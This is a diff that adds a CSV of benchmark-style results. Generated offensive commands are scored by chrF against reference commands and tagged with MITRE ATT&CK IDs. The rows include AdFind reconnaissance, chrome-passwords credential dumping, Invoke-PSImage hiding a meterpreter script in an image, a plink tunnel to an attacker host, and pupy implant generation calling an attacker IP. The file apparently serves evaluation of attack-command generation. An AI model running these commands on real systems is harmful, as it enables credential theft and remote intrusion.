@@ -1,0 +1,14 @@
+file,tool,input_command,matched_command,chrf_score,match_found
+command_adfind_TA0003_T1546.txt,adfind,"adfind -sc adobjcnt:fsp -base CN=Foreign Security Principals,CN=Schema,CN=Configuration",`adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt`,17.117,True
+command_adfind_TA0004_T1546.txt,adfind,"adfind -b CN=Application Shim Database,CN=Schema,CN=Configuration,DC=example,DC=com -sc adobjcnt:applicationshim",`adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt`,13.549,True
+command_adfind_TA0004_T1546.txt,adfind,"adfind -b CN=Application Shim Database,CN=Schema,CN=Configuration,DC=example,DC=com -ds -showdel",`adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt`,14.234,True
+command_adfind_TA0004_T1546.txt,adfind,"adfind -b CN=Application Shim Database,CN=Schema,CN=Configuration,DC=example,DC=com -fsps -showdisabled",`adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt`,13.524,True
+command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords.exe -c > shim_database_file.sdb,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",42.096,True
+command_invoke_psimage_TA0002_T1106.txt,invoke psimage,Invoke-PSImage -ScriptBlock {RtlDecompressBuffer} -OutputFile,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,39.425,True
+command_invoke_psimage_TA0003_T1543.txt,invoke psimage,Invoke-PSImage -Script <malicious_payload_script> -Out <new_image_file>.png -Image <existing_image_file>,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,34.169,True
+command_invoke_psimage_TA0003_T1543.txt,invoke psimage,Invoke-PSImage -Script <malicious_payload_script> -Out <new_image_file>.png -WebRequest,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,34.39,True
+command_invoke_psimage_TA0004_T1543.txt,invoke psimage,Import-Module .\Invoke-PSImage.ps1,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,42.03,True
+command_invoke_psimage_TA0004_T1543.txt,invoke psimage,Invoke-PSImage -Script .\T1543.ps1 -Out .\system-process.ps1 -WebRequest,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,46.78,True
+command_invoke_psimage_TA0004_T1543.txt,invoke psimage,"plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@<target_ip> -R 3389:localhost:3389",`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,8.352,True
+command_pupy_TA0004_T1055.txt,pupy,gen -f client -O windows -A x64 connect --host <ip>:<port> -t transport,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,58.531,True
+command_pupy_TA0005_T1055.txt,pupy,gen -f dll connect --host <target_ip>:<port> -t <transport>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,27.894,True
